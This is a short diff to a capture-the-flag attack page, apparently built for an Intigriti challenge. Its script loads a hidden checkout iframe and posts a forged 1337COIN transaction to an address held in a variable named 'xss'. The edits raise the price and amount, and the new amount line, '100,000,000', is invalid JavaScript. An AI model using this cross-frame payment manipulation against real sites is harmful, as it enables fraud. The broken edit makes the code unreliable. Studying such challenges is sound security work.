@@ -9,7 +9,7 @@
 
     <script>
         // --- CONFIG ---
-        const challenge = "https://challenge-0126.intigriti.io";
+        const challenge = "https://kavil.free.beeceptor.com";
         // REPLACE WITH YOUR BEECEPTOR URL
         const beeceptor = "https://kavil.free.beeceptor.com";
         
@@ -20,7 +20,7 @@
 
         // --- THE ATTACK ---
         const ifr = document.createElement('iframe');
-        ifr.src = `${challenge}/checkout.html?currency=1337COIN&price=1`;
+        ifr.src = `${challenge}/checkout.html?currency=1337COIN&price=1000000`;
         ifr.style.display = "none";
         document.body.appendChild(ifr);
 
@@ -32,7 +32,7 @@
                     transaction: {
                         toAddress: xss,
                         currency: '1337COIN',
-                        amount: 0.000001
+                        amount: 100,000,000
                     }
                 }, '*');
 
